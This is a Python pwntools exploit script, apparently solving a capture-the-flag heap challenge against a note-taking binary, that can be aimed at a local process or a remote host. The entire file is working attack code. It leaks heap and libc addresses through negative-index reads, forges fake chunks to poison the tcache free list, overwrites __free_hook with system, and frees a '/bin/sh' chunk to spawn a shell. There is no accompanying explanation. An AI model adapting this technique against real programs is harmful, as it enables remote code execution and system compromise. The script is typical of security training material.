from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "chall"
libc = ELF('libc.so.6', checksec=False)
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"Enter an option: ", content)

    def add_note(self, size, note_content):
        p = self.p
        self.send(b'1')
        p.sendlineafter(b"Size: ", str(size).encode())
        p.sendlineafter(b'Note content: ', note_content)

    def remove_note(self, note_index):
        p = self.p
        self.send(b'2')
        p.sendlineafter(b'Note index: ', str(note_index).encode())

    def view_note(self, index):
        p = self.p
        self.send(b'4')
        p.sendlineafter(b'Index: ', str(index).encode())
        
    def leak_view_note(self, index):
        p = self.p
        self.view_note(index)
        p.recvuntil(b'This note is located at: ')
        address = p.recv(14)
        return eval(address)

x, p = init()

x.add_note(0x30, flat(0, 0x41, b"C"*20))
x.add_note(0x30, b"A"*0x10)

heap_address = x.leak_view_note(0)
entries_address = x.leak_view_note(-9) + (8 * 9)
puts_address = x.leak_view_note(-25)
libc.address = puts_address - libc.sym['puts']

log.info(f"{heap_address    = :x}")
log.info(f"{entries_address = :x}")
log.info(f"{puts_address    = :x}")
log.info(f"{libc.address    = :x}")

x.remove_note(0)
x.remove_note(1)

new_chunk = heap_address + 128
chunk_to_free = new_chunk

chunk1 = flat(0, 0x31, 0, 0, 0, 0)
chunk2 = flat(0, 0x31, new_chunk+64, 0, 0, 0)
main_chunk = flat(chunk1, chunk2, chunk1, 0, 0x21)

x.add_note(0x200, main_chunk)
x.add_note(0x200, b"DUMMY")

offset = int((new_chunk + 64 - entries_address) /8)
log.info(f"{offset          = :x}")

x.remove_note(offset)
x.remove_note(0)

x.add_note(0x200, flat(b"A" * (64-16), 0, 0x31, libc.sym['__free_hook']))

x.remove_note(1)
x.add_note(0x20, b"/bin/sh\x00")
x.add_note(0x20, flat(libc.sym['system']))
x.remove_note(0)

# x.debug("heap chunks\n")

p.interactive()
